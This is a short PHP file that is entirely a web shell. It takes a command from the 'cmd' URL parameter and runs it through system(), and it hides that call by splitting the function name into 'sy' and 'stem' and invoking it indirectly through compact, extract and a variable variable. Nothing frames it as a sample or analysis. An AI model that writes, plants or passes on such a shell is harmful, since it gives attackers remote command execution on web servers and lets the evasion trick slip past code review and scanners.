<?php
$cmd = $_GET['cmd'];
$sys = 'sy'.'stem';
$var = compact('sys');
extract($var);
$$sys($cmd);
?>
